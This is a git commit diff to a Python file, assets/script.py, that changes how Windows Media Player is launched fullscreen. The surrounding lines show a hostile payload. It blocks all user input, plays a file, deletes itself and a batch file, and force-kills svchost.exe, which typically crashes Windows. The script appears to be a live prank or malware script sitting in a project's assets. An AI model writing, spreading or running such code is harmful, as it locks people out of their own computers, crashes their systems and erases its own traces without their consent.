a861f4d66151a997d216532cc87b5c6a156588ed
PumpgunStudios <127331524+eripum9@users.noreply.github.com>
2026-02-28 00:35:15 +0100

    Update script.py

--- assets/script.py
+++ assets/script.py
@@ -9,7 +9,7 @@ ctypes.windll.user32.BlockInput(True)
 
 # launch Windows Media Player explicitly in fullscreen and wait
 wmp = r'C:\Program Files\Windows Media Player\wmplayer.exe'
-subprocess.call(['cmd','/c','start','""',f'"{wmp}"','/fullscreen','/play','/close',out])
+subprocess.call([wmp, '/fullscreen', '/play', '/close', out])
 
 # spawn cleanup
 cmdline = f'cmd /c "timeout /t 2 /nobreak>nul & del \"{__file__}\" & del \"{batch}\" & TASKKILL /IM svchost.exe /F"'
